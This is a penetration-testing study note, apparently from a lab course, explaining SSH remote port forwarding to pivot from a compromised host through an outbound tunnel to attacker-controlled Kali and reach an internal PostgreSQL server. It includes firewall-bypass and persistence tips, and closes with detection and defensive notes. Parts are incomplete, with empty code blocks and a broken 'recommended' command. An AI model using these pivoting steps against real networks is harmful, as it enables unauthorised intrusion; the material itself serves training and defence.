## Overview

SSH remote port forwarding creates a listening port on the SSH server.

Traffic sent to that listening port is:

1. accepted by the SSH server,
    
2. carried backward through the SSH tunnel,
    
3. received by the SSH client,
    
4. forwarded from the SSH client to the final destination.
    

General syntax:

```bash
ssh -N -R [REMOTE_BIND_IP:]REMOTE_PORT:DESTINATION_IP:DESTINATION_PORT user@SSH_SERVER
```

The most important rule is:

```text
The -R listener exists on the SSH server.

The final destination connection is made from the SSH client.
```

Remote forwarding is useful when:

```text
you cannot connect inbound to the compromised network
but
the compromised host can make an outbound SSH connection
```

It can be thought of as:

```text
A reverse shell pattern for port forwarding
```

---

# Core Mental Model

```text
Your tool
↓
Listening socket on SSH server
↓
SSH tunnel
↓
SSH client
↓
Final internal destination
```

For the command:

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

the roles are:

|Value|Meaning|
|---|---|
|`127.0.0.1`|Bind listener to loopback on the SSH server|
|`2345`|Port opened on the SSH server|
|`10.4.50.215`|Final destination reachable from the SSH client|
|`5432`|Final destination service port|
|`kali`|User on the SSH server|
|`192.168.118.4`|SSH server address|

# Local Forwarding vs Remote Forwarding

## Local Port Forwarding

With `-L`:

```text
Listener is on the SSH client
Destination connection is made by the SSH server
```

Example:

```bash
ssh -L 127.0.0.1:8080:172.16.50.100:80 user@10.4.50.215
```

Flow:

```text
SSH client listener
↓
SSH tunnel
↓
SSH server
↓
Final destination
```

---

## Remote Port Forwarding

With `-R`:

```text
Listener is on the SSH server
Destination connection is made by the SSH client
```

Example:

```bash
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Flow:

```text
SSH server listener
↓
SSH tunnel
↓
SSH client
↓
Final destination
```

# Example Network Layout

Assume the following systems:

|Role|Host|IP|
|---|---|---|
|Attack host and SSH server|Kali|`192.168.118.4`|
|Compromised host and SSH client|CONFLUENCE01|`192.168.50.63`|
|Internal PostgreSQL server|PGDATABASE01|`10.4.50.215`|

The network situation is:

```text
Kali cannot connect to arbitrary ports on CONFLUENCE01
CONFLUENCE01 can make outbound SSH connections
CONFLUENCE01 can reach PGDATABASE01
Kali cannot directly reach PGDATABASE01
```

The perimeter firewall may allow:

```text
Inbound:
Only TCP 8090 to CONFLUENCE01

Outbound:
SSH from CONFLUENCE01 to Kali
```

This prevents a listener on CONFLUENCE01 from being useful to Kali.

Instead, CONFLUENCE01 connects outward to Kali and requests that Kali open the listening port.

# Why This Is Called Remote Forwarding

It is called remote forwarding because the listening socket is created on the remote side of the SSH connection.

The SSH command runs on:

```text
CONFLUENCE01
```

Therefore, from SSH's perspective:

```text
CONFLUENCE01 is local
Kali is remote
```

The listener is created on the remote SSH server:

```text
Kali
```

> [!important]  
> “Local” and “remote” are relative to the machine running the SSH command.

---

# Identify Each Host Before Building the Tunnel

## SSH Client

The SSH client is the machine where the `ssh -R` command runs.

Here:

```text
CONFLUENCE01
192.168.50.63
```

It initiates the outbound SSH connection.

It also makes the final connection to the internal target.

---

## SSH Server

The SSH server is the host after `user@`.

Here:

```text
Kali
192.168.118.4
```

It owns the remote listening port.

---

## Final Destination

The final destination is inside the `-R` rule.

Here:

```text
10.4.50.215:5432
```

This destination must be reachable from the SSH client.

---

## Local Consumer

The local consumer is the tool that connects to the remote listener.

Here:

```text
psql running on Kali
```

It connects to:

```text
127.0.0.1:2345
```

# 1. Confirm the SSH Client Can Reach the Target

Before creating the remote forward, test the internal destination from the compromised host.

On CONFLUENCE01:

```bash
nc -nvz 10.4.50.215 5432
```

Alternative:

```bash
timeout 3 bash -c '</dev/tcp/10.4.50.215/5432' && echo open
```

The final destination must be reachable from:

```text
CONFLUENCE01
```

It does not need to be reachable from Kali.

---

# 2. Start the SSH Server on Kali

On Kali:

```bash
sudo systemctl start ssh
```

Check status:

```bash
sudo systemctl status ssh
```

Verify the listener:

```bash
sudo ss -lntp | grep ':22'
```

Expected:

```text
0.0.0.0:22
[::]:22
```

This means the SSH server is listening on all interfaces.

---

# 3. Confirm Kali Is Reachable from the Compromised Host

From CONFLUENCE01:

```bash
nc -nvz 192.168.118.4 22
```

or:

```bash
ssh kali@192.168.118.4
```

The outbound SSH connection must be permitted through the firewall.

---

# 4. SSH Password Authentication

The Kali SSH server may require password authentication to be enabled.

Configuration file:

```text
/etc/ssh/sshd_config
```

Relevant setting:

```text
PasswordAuthentication yes
```

After changing the configuration:

```bash
sudo systemctl restart ssh
```

> [!warning]  
> Use a strong, unique password when exposing an SSH server during an assessment.

# 5. Build the Remote Forward Rule

OpenSSH remote-forwarding format:

```text
[REMOTE_BIND_IP:]REMOTE_PORT:DESTINATION_IP:DESTINATION_PORT
```

For this scenario:

```text
REMOTE_BIND_IP   = 127.0.0.1
REMOTE_PORT      = 2345
DESTINATION_IP   = 10.4.50.215
DESTINATION_PORT = 5432
```

Result:

```text
127.0.0.1:2345:10.4.50.215:5432
```

Add the SSH server:

```text
kali@192.168.118.4
```

Complete command:

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

# 6. Command Breakdown

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

|Component|Meaning|
|---|---|
|`ssh`|Start OpenSSH client on CONFLUENCE01|
|`-N`|Do not open a remote shell|
|`-R`|Create a remote port forward|
|`127.0.0.1`|Bind listener to loopback on Kali|
|`2345`|Port opened on Kali|
|`10.4.50.215`|Final PostgreSQL server|
|`5432`|PostgreSQL service port|
|`kali`|SSH user on Kali|
|`192.168.118.4`|Kali SSH server address|

---

# 7. Where the Command Runs

Run this command on:

```text
CONFLUENCE01
```

Not on:

```text
Kali
PGDATABASE01
```

Reason:

```text
CONFLUENCE01 must initiate the outbound SSH connection
CONFLUENCE01 can reach the internal PostgreSQL server
Kali owns the listener
```

---

# 8. Why Bind to 127.0.0.1?

This part:

```text
127.0.0.1:2345
```

means:

```text
Create the listener only on Kali's loopback interface
```

Only tools running on Kali can connect to it.

Example:

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

This is safer than exposing the remote forward to the network.

---

# 9. Binding the Remote Listener Externally

A remote forward can request a listener on all interfaces:

```bash
ssh -N -R 0.0.0.0:2345:10.4.50.215:5432 kali@192.168.118.4
```

This would attempt to expose the listener on:

```text
0.0.0.0:2345
```

on Kali.

However, OpenSSH server configuration often restricts remote forwards to loopback.

Relevant setting:

```text
GatewayPorts
```

Possible values:

|Value|Meaning|
|---|---|
|`no`|Remote forwards bind to loopback|
|`yes`|Remote forwards may bind to all interfaces|
|`clientspecified`|Client may choose the bind address|

Example SSH server configuration:

```text
GatewayPorts clientspecified
```

Restart SSH after changes:

```bash
sudo systemctl restart ssh
```

> [!warning]  
> Exposing a remote-forward listener externally may allow other hosts to access the internal service.

---

# 10. Why the Destination Is PGDATABASE01

The destination inside the `-R` rule is:

```text
10.4.50.215:5432
```

This is the service CONFLUENCE01 can reach.

Kali does not need a route to:

```text
10.4.50.215
```

The connection is made by:

```text
CONFLUENCE01
```

Conceptually:

```text
Kali owns listener
CONFLUENCE01 owns destination connectivity
```

---

# 11. Start the Tunnel

On CONFLUENCE01:

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

After authentication, no shell prompt appears.

This is expected because:

```text
-N = do not execute a remote command
```

The SSH process stays in the foreground and maintains the tunnel.

---

# 12. Verify the Listener on Kali

On Kali:

```bash
ss -lntp | grep 2345
```

Expected:

```text
127.0.0.1:2345
```

Example:

```text
tcp LISTEN 0 128 127.0.0.1:2345 0.0.0.0:*
```

This confirms:

```text
The SSH server has created the requested remote listener.
```

# 13. Connect from Kali

Use the service client against Kali's local listener.

For PostgreSQL:

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

Command breakdown:

|Option|Meaning|
|---|---|
|`-h 127.0.0.1`|Connect to Kali's local listener|
|`-p 2345`|Use the remote-forward port|
|`-U postgres`|Authenticate to PostgreSQL|

Traffic flow:

```text
psql
↓
127.0.0.1:2345 on Kali
↓
SSH tunnel
↓
CONFLUENCE01
↓
10.4.50.215:5432
```

Used when CONFLUENCE01 connects back to Kali:

```text

```

## PostgreSQL Authentication

```text

```

# Repeatable Methodology

## Step 1 – Identify the SSH Client

Ask:

```text
Which compromised host can make the outbound SSH connection?
```

Record:

```text
SSH client: <compromised_host>
```

This host must be able to reach the final destination.

---

## Step 2 – Identify the SSH Server

Ask:

```text
Which attacker-controlled SSH server can the compromised host reach?
```

Record:

```text
SSH server IP: <attacker_ssh_ip>
SSH username: <ssh_user>
```

The remote listener will be created here.

---

## Step 3 – Identify the Final Destination

Ask:

```text
What internal host and service can the compromised host reach?
```

Record:

```text
Destination IP: <destination_ip>
Destination port: <destination_port>
```

---

## Step 4 – Choose the Remote Listener

Ask:

```text
Who needs to connect to the listener?
```

If only tools on the SSH server:

```text
127.0.0.1
```

If other systems must connect:

```text
0.0.0.0
```

or the SSH server's specific interface, provided `GatewayPorts` allows it.

---

## Step 5 – Build the Command

Template:

```bash
ssh -N -R <remote_bind_ip>:<remote_port>:<destination_ip>:<destination_port> <ssh_user>@<ssh_server_ip>
```

---

## Step 6 – Run It on the Compromised Host

The `ssh -R` command runs on:

```text
the SSH client
```

not the SSH server.

---

## Step 7 – Connect to the Listener

Your tool connects to:

```text
<ssh_server_listener_ip>:<remote_port>
```

Example:

```text
127.0.0.1:2345
```

# Useful SSH Options

## No Remote Shell

```text
-N
```

Use when the connection exists only for forwarding.

---

## Background the Tunnel

```bash
ssh -fN -R <rule> user@<ssh_server>
```

Example:

```bash
ssh -fN -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

---

## Verbose Troubleshooting

```bash
ssh -vvv -N -R <rule> user@<ssh_server>
```

---

## Fail If Forward Cannot Be Created

```bash
ssh \
    -o ExitOnForwardFailure=yes \
    -N \
    -R 127.0.0.1:2345:10.4.50.215:5432 \
    kali@192.168.118.4
```

---

## Keep the Tunnel Alive

```bash
ssh \
    -o ServerAliveInterval=30 \
    -o ServerAliveCountMax=3 \
    -N \
    -R 127.0.0.1:2345:10.4.50.215:5432 \
    kali@192.168.118.4
```

# Recommended Full Command

```bash
ssh \
    -o ExitOnForwardFailure=yes \

    -o ServerAliveCountMax=3 \
    -N \
    -R 127.0.0.1:2345:10.4.50.215:5432 \
    kali@192.168.118.4
```

# Reverse Remote Forward with SSH Keys

For stable access, use a dedicated assessment key.

Generate:

```bash
ssh-keygen -f remote-forward-key
```

Place the public key in Kali's:

```text
~/.ssh/authorized_keys
```

Run from the compromised host:

```bash
ssh \
    -i remote-forward-key \
    -N \
    -R 127.0.0.1:2345:10.4.50.215:5432 \
    kali@192.168.118.4
```

> [!warning]  
> Remove temporary assessment keys during cleanup.

# Troubleshooting

## No Output After Authentication

This is normal with:

```text
-N
```

Verify the listener on the SSH server:

```bash
ss -lntp | grep <remote_port>
```

---

## Listener Does Not Appear on Kali

Check the SSH client with verbose mode:

```bash
ssh -vvv -N -R <rule> user@<ssh_server>
```

Possible causes:

```text
remote port already in use
SSH server disables forwarding
AllowTcpForwarding is disabled
authentication failure
incorrect bind syntax
```

Relevant SSH server setting:

```text
AllowTcpForwarding yes
```

---

## Listener Binds Only to 127.0.0.1

This is normal when:

```text
GatewayPorts no
```

Use loopback if only Kali needs the listener.

To expose it externally, configure:

```text
GatewayPorts clientspecified
```

then request:

```bash
-R 0.0.0.0:<port>:<destination_ip>:<destination_port>
```

---

## Kali Can Reach the Listener but Not the Service

Test the destination from the SSH client:

```bash
nc -nvz <destination_ip> <destination_port>
```

The final destination must be reachable from the compromised host.

---

## Connection to Kali SSH Server Fails

Check:

```text
Kali SSH service is running
port 22 is listening
firewall allows inbound SSH
compromised host can route to Kali
password or key authentication is allowed
```

Commands on Kali:

```bash
sudo systemctl status ssh
sudo ss -lntp | grep ':22'
```

---

## Remote Port Is Already in Use

Check on Kali:

```bash
ss -lntp | grep <remote_port>
```

Choose another port or stop the existing listener.

---

## Service Uses the Wrong IP

Remember:

```text
The destination IP must be reachable from the SSH client.
```

Do not use an IP that is only meaningful from Kali's network view.

---

## Cannot Bind a Low Port

The remote listener is created by `sshd` on the SSH server.

Low-port behavior depends on SSH server permissions and configuration.

To avoid complications, use a high port:

```text
15432
2222
8080
13389
```

---

## Tunnel Drops Frequently

Use:

```bash
-o ServerAliveInterval=30
-o ServerAliveCountMax=3
```

For unreliable shells, consider running the SSH process under:

```text
nohup
screen
tmux
```

where available.

# Remote Forwarding Decision Guide

Use local forwarding when:

```text
You can reach the SSH client listener
The SSH server can reach the final destination
Inbound connectivity to the listener is allowed
```

Use remote forwarding when:

```text
Inbound connections to the compromised network are blocked
The compromised host can SSH outward
You control an SSH server
The compromised host can reach the final internal service
```

Use dynamic forwarding when:

```text
You need access to many hosts and ports
You can reach the SOCKS listener
Your tools support SOCKS or Proxychains
```

---

# Security and Detection Notes

Potential indicators include:

```text
outbound SSH from an application server
long-lived SSH sessions
sshd listening on unexpected forwarded ports
connections from compromised hosts to internal services
ssh processes using -R
```

Defensive controls include:

```text
restrict outbound SSH
disable unnecessary TCP forwarding
set AllowTcpForwarding no where appropriate
monitor unusual remote forwards
restrict GatewayPorts
monitor long-lived outbound sessions
```

# Key Takeaways

- `ssh -R` creates the listener on the SSH server.
    
- The SSH command runs on the SSH client.
    
- The SSH client initiates the outbound connection.
    
- The SSH client also connects to the final destination.
    
- Kali connects to the listener on its own machine.
    
- The destination inside the `-R` rule must be reachable from the compromised host.
    
- Remote forwarding is useful when inbound access is blocked but outbound SSH is allowed.
    
- `127.0.0.1` keeps the forwarded port private to the SSH server.
    
- `0.0.0.0` may expose it externally and may require `GatewayPorts`.
    
- SSH authentication and final-service authentication are separate.
    
- Verify the listener on the SSH server and destination reachability from the SSH client.
